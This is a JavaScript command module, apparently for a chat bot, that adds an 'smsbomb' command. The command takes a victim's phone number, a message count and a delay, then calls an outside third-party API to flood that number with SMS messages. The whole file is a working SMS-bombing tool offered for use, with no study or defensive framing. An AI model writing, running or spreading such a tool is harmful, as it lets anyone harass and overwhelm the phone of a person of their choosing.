const axios = require('axios');

module.exports.config = {
  name: "smsbomb",
  version: "1.0.0",
  role: 0,
  hasPrefix: false,
  credits: "chupapieh",
  description: "Initiates SMS bombing.",
  usages: "smsbomb [phone] [amount] [cooldown]",
  cooldowns: 3,
};

module.exports.run = async ({ api, event, args }) => {
  const { threadID, messageID } = event;
  const [phone, amount, cooldown] = args;

  if (!phone || !amount || !cooldown) {
    return api.sendMessage("Usage: smsbomb [phone] [amount] [cooldown]", threadID, messageID);
  }

  api.sendMessage('⚙️ Starting SMS Bombing...', threadID, messageID);

  try {
    const response = await axios.get('https://deku-rest-api.gleeze.com/smsb', {
      params: {
        number: phone,
        amount: amount,
        delay: cooldown
      }
    });
    const data = response.data;
    console.log('Response:', data);

    api.sendMessage('Success! All messages have been sent 💣', threadID, messageID);
  } catch (error) {
    console.error('Error:', error);
    api.sendMessage('🔥 An error occurred while sending messages.', threadID, messageID);
  }
};
